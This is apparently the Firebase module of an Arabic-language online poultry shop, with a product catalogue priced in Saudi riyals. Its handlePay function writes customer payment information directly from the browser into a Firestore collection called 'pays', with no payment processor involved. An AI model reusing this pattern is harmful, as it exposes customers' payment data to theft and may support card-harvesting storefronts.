// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId: import.meta.env.VITE_FIREBASE_MEASUREMENT_ID,
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef, data);

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db };
const sarToKwd = 0.081;

export const products = [
  {
    id: 1,
    name: "1 كيلو دجاج مبرد مجمد",
    description: "دجاج طازج مبرد وزن 1 كغ، مناسب للطهي المباشر.",
    priceSAR: 26.5,
    img: "link-to-image-1",
  },
  {
    id: 2,
    name: "10 كيلو دجاج مفروم طازج",
    description: "مفروم دجاج طازج عالي الجودة، وزن 10 كغ.",
    priceSAR: 240,
    img: "link-to-image-2",
  },
  {
    id: 3,
    name: "حمام فرنسي طلح العجوز",
    description: "حمام فرنسي طازج محشي بالأرز والتوابل.",
    priceSAR: null,
    img: "link-to-image-3",
  },
  {
    id: 4,
    name: "حمام سيناوي 6",
    description: "عبوة حمام سيناوي طازج، تحتوي على 6 حمامات.",
    priceSAR: null,
    img: "link-to-image-4",
  },
  {
    id: 5,
    name: "5 بط بلدي طازج",
    description: "بط بلدي طبيعي، وزن العبوة 5 بطات.",
    priceSAR: 213.04,
    img: "link-to-image-5",
  },
  {
    id: 6,
    name: "بط بلدي طازج",
    description: "بطة بلدية طازجة، وزن تقريبي 2 كغ.",
    priceSAR: 49,
    img: "link-to-image-6",
  },
  {
    id: 7,
    name: "5 حبات دجاج بلدي أحمر",
    description: "دجاج بلدي أحمر طازج، 5 دجاجات.",
    priceSAR: 119.13,
    img: "link-to-image-7",
  },
  {
    id: 8,
    name: "دجاج بلدي أحمر طازج",
    description: "دجاجة بلدية حمراء طازجة، وزن تقريبي 1.2 كغ.",
    priceSAR: 29.57,
    img: "link-to-image-8",
  },
  {
    id: 9,
    name: "مفروم دجاج طازج 450غ",
    description: "مفروم دجاج طازج بوزن 450 غرام.",
    priceSAR: 22.61,
    img: "link-to-image-9",
  },
  {
    id: 10,
    name: "أرانب بلدي طازج",
    description: "أرانب بلدية طازجة، جاهزة للطبخ.",
    priceSAR: 46,
    img: "link-to-image-10",
  },
  {
    id: 11,
    name: "أفخاذ دجاج 450غ mvc",
    description: "أفخاذ دجاج طازجة بوزن 450 غرام.",
    priceSAR: 9.52,
    img: "link-to-image-11",
  },
  {
    id: 12,
    name: "ساقان دجاج 450غ mvc",
    description: "ساقان دجاج طازج بوزن 450 غرام.",
    priceSAR: 9.52,
    img: "link-to-image-12",
  },
  {
    id: 13,
    name: "صدور دجاج 450غ mvc",
    description: "صدور دجاج طازج خالي من العظم بوزن 450 غرام.",
    priceSAR: 19.09,
    img: "link-to-image-13",
  },
  {
    id: 14,
    name: "أجنحة دجاج mvc",
    description: "أجنحة دجاج طازجة، عبوة اقتصادية.",
    priceSAR: 5.17,
    img: "link-to-image-14",
  },
  {
    id: 15,
    name: "صدور دجاج 1 كغ mvc",
    description: "صدور دجاج طازجة خالية من العظم، وزن 1 كغ.",
    priceSAR: 38.17,
    img: "link-to-image-15",
  },
];
